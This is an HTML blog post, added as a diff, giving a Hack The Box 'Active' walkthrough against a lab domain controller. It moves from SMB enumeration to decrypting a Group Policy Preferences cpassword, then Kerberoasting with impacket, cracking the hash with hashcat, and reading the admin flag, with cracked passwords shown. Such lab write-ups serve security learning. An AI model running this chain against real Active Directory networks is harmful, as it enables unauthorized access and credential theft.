@@ -1,0 +1,329 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+  
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  
+  <link rel="stylesheet" href="/assets/css/style.css">
+  <link rel="icon" type="image/png" href="/assets/favicon.png" /><link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="InfoSecBlog" /></head>
+<head>
+    <meta charset="utf-8">
+    <title>HTB-Active</title>
+  </head>
+  <body>
+<div class="site-header">
+  <div class="wrapper">
+    <a class="site-title" rel="author" href="/">InfoSecBlog<b class="command_prompt"></b><b class="blinking_cursor">_</b></a>
+    <span class="social_links">
+        <a class="color-red-hover" href="https://abdullahalshubaili.github.io"><i class="fab fa-itch-io"></i></a><a class="color-purple-hover" href="https://github.com/abdullahalshubaili"><i class="fab fa-github-square"></i></a><a class="color-cyan-hover" href="https://www.linkedin.com/in/abdullah-alshubaili-007943108/"><i class="fab fa-linkedin"></i></a>
+    </span>
+  </div>
+</div>
+<main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        
+<div class="post">
+  <h1 class="post-title">HTB-Active</h1>
+  
+  <div class="post-tags">
+      
+      <a class="tag" href="/tag/HTB/">HTB</a>
+      
+      <a class="tag" href="/tag/Active/">Active</a>
+      
+  </div>
+  
+  <div class="post-date">Published on 23 Jul 2021</div>
+  
+  <div class="post-description">Hack the Box - Active Machine.</div>
+  
+  <h1 id="brief-summary">Brief Summary</h1>
+
+<p>This box is considered easy but very entertaining. The hacking of this machine invlove some <strong>Cryptography</strong> and <strong>Microsoft Active Directory</strong>, hence the name of machine.</p>
+
+<p><img src="/assets/active/machine.png" alt="machine" /></p>
+<h1 id="nmap">Nmap</h1>
+<p>As usual start off with nmap 10.10.10.100 -A</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># Nmap 7.91 scan initiated Thu Jul 22 20:29:07 2021 as: nmap -A -oN nmap-A 10.10.10.100
+Nmap scan report for 10.10.10.100
+Host is up (0.13s latency).
+Not shown: 983 closed ports
+PORT      STATE SERVICE       VERSION
+53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
+| dns-nsid: 
+|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
+88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2021-07-22 17:34:21Z)
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
+445/tcp   open  microsoft-ds?
+464/tcp   open  kpasswd5?
+593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  tcpwrapped
+3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
+49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+
+Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: 4m27s
+| smb2-security-mode: 
+|   2.02: 
+|_    Message signing enabled and required
+| smb2-time: 
+|   date: 2021-07-22T17:35:20
+|_  start_date: 2021-07-22T16:59:16
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Thu Jul 22 20:31:02 2021 -- 1 IP address (1 host up) scanned in 114.43 seconds
+</code></pre></div></div>
+
+<h1 id="enumeration">Enumeration</h1>
+<p>Port SMB is open. Lets take a look at it, using <code class="language-plaintext highlighter-rouge">smbclient</code>.</p>
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>smbclient <span class="nt">-L</span> 10.10.10.100
+Enter WORKGROUP<span class="se">\G</span>UEST<span class="s1">'s password: 
+Anonymous login successful
+
+        Sharename       Type      Comment
+        ---------       ----      -------
+        ADMIN$          Disk      Remote Admin
+        C$              Disk      Default share
+        IPC$            IPC       Remote IPC
+        NETLOGON        Disk      Logon server share 
+        Replication     Disk      
+        SYSVOL          Disk      Logon server share 
+        Users           Disk      
+SMB1 disabled -- no workgroup available
+</span></code></pre></div></div>
+<p>(when prompt for pass, just press enter)</p>
+
+<p>After enumerating each folder, the interesting stuff were found in ‘Replication’</p>
+
+<p>Let’s download the whole folder to make our search easier.</p>
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smbclient <span class="s1">'//10.10.10.100/Replication'</span> <span class="nt">-c</span> <span class="s1">'prompt OFF;recurse ON;cd active.htb;mget *'</span>
+</code></pre></div></div>
+<p>Now searching in the downloaded folder for hot stuff using grep.</p>
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">grep</span> <span class="nt">-rn</span> active.htb <span class="nt">-e</span> <span class="s1">'password\|user'</span>
+active.htb/Policies/<span class="o">{</span>31B2F340-016D-11D2-945F-00C04FB984F9<span class="o">}</span>/MACHINE/Preferences/Groups/Groups.xml:2:&lt;Groups <span class="nv">clsid</span><span class="o">=</span><span class="s2">"{3125E937-EB16-4b4c-9934-544FC6D24D26}"</span><span class="o">&gt;</span>&lt;User <span class="nv">clsid</span><span class="o">=</span><span class="s2">"{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}"</span> <span class="nv">name</span><span class="o">=</span><span class="s2">"active.htb</span><span class="se">\S</span><span class="s2">VC_TGS"</span> <span class="nv">image</span><span class="o">=</span><span class="s2">"2"</span> <span class="nv">changed</span><span class="o">=</span><span class="s2">"2018-07-18 20:46:06"</span> <span class="nv">uid</span><span class="o">=</span><span class="s2">"{EF57DA28-5F69-4530-A59E-AAB58578219D}"</span><span class="o">&gt;</span>&lt;Properties <span class="nv">action</span><span class="o">=</span><span class="s2">"U"</span> <span class="nv">newName</span><span class="o">=</span><span class="s2">""</span> <span class="nv">fullName</span><span class="o">=</span><span class="s2">""</span> <span class="nv">description</span><span class="o">=</span><span class="s2">""</span> <span class="nv">cpassword</span><span class="o">=</span><span class="s2">"edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ"</span> <span class="nv">changeLogon</span><span class="o">=</span><span class="s2">"0"</span> <span class="nv">noChange</span><span class="o">=</span><span class="s2">"1"</span> <span class="nv">neverExpires</span><span class="o">=</span><span class="s2">"1"</span> <span class="nv">acctDisabled</span><span class="o">=</span><span class="s2">"0"</span> <span class="nv">userName</span><span class="o">=</span><span class="s2">"active.htb</span><span class="se">\S</span><span class="s2">VC_TGS"</span>/&gt;&lt;/User&gt;
+<span class="nb">grep</span>: and: No such file or directory
+<span class="nb">grep</span>: user: No such file or directory
+</code></pre></div></div>
+
+<p>Nice, we found some encrypted password with cleartext username ‘SVC_TGS’  and it is using Group Policy Preferences (GPP). The path ‘Policies/***/Preferences/Groups/Groups.xml’ tells us that GPP is in use.</p>
+
+<p>Good thing is that GPP has a critical security flaw. It stores credentials insecurely. Here is a link to vulnerability <a href="https://support.microsoft.com/en-us/topic/ms14-025-vulnerability-in-group-policy-preferences-could-allow-elevation-of-privilege-may-13-2014-60734e15-af79-26ca-ea53-8cd617073c30">MS14-025</a> .</p>
+
+<h1 id="cryptography--user-own">Cryptography &amp; User Own</h1>
+
+<p>Since the GPP is infected with MS14-025, it means that we can easily decrypt the cipher using <code class="language-plaintext highlighter-rouge">gpp-decrypt</code> tool in kali linux.</p>
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>gpp-decrypt <span class="s1">'edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ'</span>
+
+GPPstillStandingStrong2k18
+</code></pre></div></div>
+
+<p>Neat, we got a password.</p>
+
+<p>Now let’s repeat the smbclient attack again with credential this time.</p>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smbclient <span class="s1">'//10.10.10.100/NETLOGON'</span> <span class="nt">-U</span> <span class="s2">"SVC_TGS"</span> <span class="nt">-c</span> <span class="s1">'prompt OFF;recurse ON;cd active.htb;mget *'</span>
+</code></pre></div></div>
+<p>-U flag for username
+(when prompt for password entered: GPPstillStandingStrong2k18)
+After donwloading ‘Users’ folders, we found the user.txt flag under ‘Users\SVC_TGS\Desktop'</p>
+
+<h1 id="active-directory-enumeration">Active Directory Enumeration</h1>
+<p>This step require <code class="language-plaintext highlighter-rouge">impacket</code> package from python to penetrate further in AD.(if tool not installed run <code class="language-plaintext highlighter-rouge">pip install impacket</code>)</p>
+
+<p>Using <code class="language-plaintext highlighter-rouge">GetADUsers.py</code> to list all existing users in AD.</p>
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>GetADUsers.py <span class="nt">-all</span> active.htb/svc_tgs <span class="nt">-dc-ip</span> 10.10.10.100 
+...
+...
+Password:
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Querying 10.10.10.100 <span class="k">for </span>information about domain.
+Name                  Email                           PasswordLastSet      LastLogon           
+<span class="nt">--------------------</span>  <span class="nt">------------------------------</span>  <span class="nt">-------------------</span>  <span class="nt">-------------------</span>
+Administrator                                         2018-07-18 19:06:40.351723  2021-01-21 16:07:03.723783 
+Guest                                                 &lt;never&gt;              &lt;never&gt;             
+krbtgt                                                2018-07-18 18:50:36.972031  &lt;never&gt;             
+SVC_TGS                                               2018-07-18 20:14:38.402764  2018-07-21 14:01:30.320277 
+</code></pre></div></div>
+<p>(enter password when prompt: GPPstillStandingStrong2k18)
+Now lets check if there is a Service Pricipal Name SPN running under SVC_TGS account.</p>
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>GetUserSPNs.py active.htb/svc_tgs <span class="nt">-dc-ip</span> 10.10.10.100
+
+ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation 
+<span class="nt">--------------------</span>  <span class="nt">-------------</span>  <span class="nt">--------------------------------------------------------</span>  <span class="nt">--------------------------</span>  <span class="nt">--------------------------</span>  <span class="nt">----------</span>
+active/CIFS:445       Administrator  <span class="nv">CN</span><span class="o">=</span>Group Policy Creator Owners,CN<span class="o">=</span>Users,DC<span class="o">=</span>active,DC<span class="o">=</span>htb  2018-07-18 19:06:40.351723  2021-01-21 16:07:03.723783   
+</code></pre></div></div>
+
+<p>Nice, Since the service account ‘SVC_TGS’ is running by administrator, we can request a Ticket Granting Service (TGS) and attempt to decrypt it.</p>
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>GetUserSPNs.py <span class="nt">-request</span> active.htb/svc_tgs <span class="nt">-dc-ip</span> 10.10.10.100
+
+
+<span class="nv">$krb5tgs$23$*</span>Administrator<span class="nv">$ACTIVE</span>.HTB<span class="nv">$active</span>.htb/Administrator<span class="k">*</span><span class="nv">$c3eedcf601434a82ec2a2127f0443e15$bbec4fab6535c331745fbc6442a428baa571d859aec3cce6f4ae1de127201b5a92854ae7a3ad8b5c228e8fa49f41f26d5fdbc0110a87b3ee486be86de4c1bd74c2f02d06a7f68799a6be79b4164ab90f4478a0032a2d6ddd23520999cee9c1461a64cffb4c70a29d3240637a426f4e2e23badaacffcfc0a3659628cff6129b5c8026b03404059c5f7d6a4d65c769aa6f98f4597b79a4e28fd78a520d8622d55307318fec49cf0dc372579b809a17af52cc03f0ec86bbec96ec1cbcddb2f41acac92095e80153cfc1cf14777d385af9af95cf4ffd29f07ca9286765fae92fa60152cc5c4ba4cd85fbe6be0d440cb96c3c521a926e7e2949a6ede318e6150f5943f8df2f35091b27d5940f81ae5791bbb871fac35f4b1e4d0b8126870095f1e5007a3e5fa2d044a437e7b7e1ff5eccbc5dc01db06fa5526787ef10232bf090dfaa4a35afb6ae8e148ee4295a4bc21407fd681f2a61780235fcaa67d5c7f7d24d77ddb926d5425614c3d32227f6d8e5aa9a3dff1b95b9bdbb80a401d55ed3609cb4d3f67231c769527c566c94a92f587315765b61ff6febf61a72c55d2f70daef4bf004ff51ee118d619131515bd726f544bd886a30b8e3ad7ee97b25a28dfe64afd847be1375d9df92e5a71ff741148b47b2d3920d0cb4b6dd1850f629f071203fa8239f76d52194aa202c8d8151368cacae741a2fd6e58e49320491f0dc3fc6467c848f1ca5f5b460e0ad2e74bced9eb93d56828312ddca568ab949ecbe847326fc059d6854c3680caef798a12306cae22869d0ef74510603862108e90e51561f5a24c47160f5fb60bb618dcf53458ab1fd36f9c43b1b8db6a9c778e2f14648be31d38c0ff6632c9cb7f7df9d3972eb6d62cb8aa21094071b0e2d637a9365e3939eea7ea80fbef3b7cf2925eef18cf1e573c3915bc85452747b8bdb810f7d78fcfdb89ed33b399e0164060fda25428d0e283f3cbc9c6f112998932588403649a9939d4649add6077de3b11351dfa8cde64562de1d6d13258e3725b126a8b8d91166e9922cec43a676e33cc03b11666eadac22c0050f349ad2ca4cc93e6c748b92e914c644a2081d0df1c188fcfe58d22432aa75de2bbe419d81b1c014b570fdbe2c14b8c5765601adcbcfe0fe84455a5ac74b41a5be46eda91a4139b6d571e50af04813c4463bba0c6726c10670640360c43293c4c5aa02b267e0ca3b9fc29c1a9f40e98e957d63acbb04bb8d6df9e875e3ae9adb6975d608c19e</span>
+
+</code></pre></div></div>
+
+<p>Now let save the output to a file and decrypt it using hashcat with rockyou.txt dictionary.</p>
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hashcat <span class="nt">-m</span> 13100 <span class="nb">hash</span> ~/wordlists/rockyou.txt
+</code></pre></div></div>
+<p>the price is: Ticketmaster1968</p>
+
+<h1 id="post-exploitation--root-own">Post Exploitation &amp; Root Own</h1>
+
+<p>Using smbclient to grab the flag with newly found credentials for admin.</p>
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>smbclient <span class="s1">'//10.10.10.100/Users/'</span> <span class="nt">-U</span> <span class="s1">'administrator'</span>
+Enter WORKGROUP<span class="se">\a</span>dministrator<span class="s1">'s password: 
+(enter: Ticketmaster1968)
+Try "help" to get a list of possible commands.
+smb: \&gt; cd Administrator/Desktop/
+smb: \Administrator\Desktop\&gt; get root.txt
+getting file \Administrator\Desktop\root.txt of size 34 as root.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
+smb: \Administrator\Desktop\&gt; exit
+$ cat root.txt 
+b5fc76d1d6b91d77b***************
+</span></code></pre></div></div>
+
+<p>Thanks for reading.</p>
+
+</div>
+
+
+<div class="comments">
+<div id="disqus_thread"></div>
+<script>
+ var disqus_config = function () {
+     this.page.url = 'http://localhost:4000/hack%20the%20box/2021/07/23/HTB-Active.html';
+     this.page.identifier = '/hack%20the%20box/2021/07/23/HTB-Active';
+     this.page.title = 'HTB-Active';
+ };
+
+ (function() {  // REQUIRED CONFIGURATION VARIABLE: EDIT THE SHORTNAME BELOW
+     var d = document, s = d.createElement('script');
+
+     s.src = '//Abdullah Alshubaili.disqus.com/embed.js';
+
+     s.setAttribute('data-timestamp', +new Date());
+     (d.head || d.body).appendChild(s);
+ })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow">comments powered by Disqus.</a></noscript>
+
+</div>
+
+
+
+
+<div class="related">
+  <h2>related posts</h2>
+  <ul class="related-posts">
+    
+      <li>
+        <h3>
+          <a href="/hack%20the%20box/2020/09/05/HTB-Mango.html">
+            HTB-Mango
+          </a>
+        </h3>
+      </li>
+    
+      <li>
+        <h3>
+          <a href="/hack%20the%20box/2020/09/05/HTB-Magic.html">
+            HTB-Magic
+          </a>
+        </h3>
+      </li>
+    
+  </ul>
+</div>
+
+
+
+
+  
+  <h2>all tags</h2>
+  <div class="tag-cloud"><a href="/tag/active/" class="set-1">Active</a> <a href="/tag/htb/" class="set-5">HTB</a> <a href="/tag/magic/" class="set-1">Magic</a> <a href="/tag/mango/" class="set-1">Mango</a></div>
+  
+
+
+
+      </div>
+    </main><footer class="site-footer">
+  <div class="wrapper">
+
+    <div class="credits"> Thanks to <a href="https://github.com/bitbrain/jekyll-dash">bitbrain</a> for this theme.<div class="toggleWrapper">
+    <input type="checkbox" class="dn" id="theme-toggle" onclick="modeSwitcher()" checked />
+    <label for="theme-toggle" class="toggle">
+    <span class="toggle__handler">
+      <span class="crater crater--1"></span>
+      <span class="crater crater--2"></span>
+      <span class="crater crater--3"></span>
+    </span>
+        <span class="star star--1"></span>
+        <span class="star star--2"></span>
+        <span class="star star--3"></span>
+        <span class="star star--4"></span>
+        <span class="star star--5"></span>
+        <span class="star star--6"></span>
+    </label>
+</div>
+<script type="text/javascript">
+const theme = localStorage.getItem('theme');
+
+if (theme === "light") {
+    document.documentElement.setAttribute('data-theme', 'light');
+} else {
+    document.documentElement.setAttribute('data-theme', 'dark');
+}
+const userPrefers = getComputedStyle(document.documentElement).getPropertyValue('content');
+
+function activateDarkTheme() {
+    document.getElementById('theme-toggle').checked = true;
+    document.documentElement.setAttribute('data-theme', 'dark');
+    document.documentElement.classList.add('theme--dark');
+    document.documentElement.classList.remove('theme--light');
+	document.getElementById("theme-toggle").className = 'light';
+	window.localStorage.setItem('theme', 'dark');
+}
+
+function activateLightTheme() {
+    document.getElementById('theme-toggle').checked = false;
+    document.documentElement.setAttribute('data-theme', 'light');
+    document.documentElement.classList.add('theme--light');
+    document.documentElement.classList.remove('theme--dark');
+	document.getElementById("theme-toggle").className = 'dark';
+	window.localStorage.setItem('theme', 'light');
+}
+
+if (theme === "dark") {
+    activateDarkTheme();
+} else if (theme === "light") {
+    activateLightTheme();
+} else if  (userPrefers === "light") {
+    activateDarkTheme();
+} else {
+    activateDarkTheme();
+}
+
+function modeSwitcher() {
+	let currentMode = document.documentElement.getAttribute('data-theme');
+	if (currentMode === "dark") {
+	    activateLightTheme();
+	} else {
+	    activateDarkTheme();
+	}
+}
+</script></div>
+  </div>
+</footer>
+
+
+<script>
+      window.FontAwesomeConfig = {
+        searchPseudoElements: true
+      }
+    </script>
+  </body>
+
+</html>
